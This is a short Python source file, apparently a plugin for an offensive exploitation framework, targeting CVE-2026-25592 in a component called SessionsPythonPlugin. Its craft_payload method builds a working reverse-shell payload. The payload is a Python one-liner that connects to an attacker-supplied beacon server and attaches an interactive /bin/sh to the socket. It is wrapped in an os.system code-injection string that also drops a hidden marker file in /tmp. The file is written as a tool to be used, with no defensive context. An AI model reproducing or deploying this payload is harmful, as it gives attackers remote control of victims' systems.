"""CVE-2026-25592 SessionsPythonPlugin 载荷插件。"""

from core.weapon_plugins.base import CVEWeaponPlugin


class Plugin(CVEWeaponPlugin):
    def craft_payload(self, beacon_server: str, **kwargs) -> str:
        rev = (
            "python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect(\"{beacon_server.split(':')[0]}\","
            f"{beacon_server.split(':')[1]});"
            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            "subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
        return (
            f"__import__('os').system({repr(rev)}) and "
            "__import__('os').system('echo hooked > /tmp/.hooked')"
        )
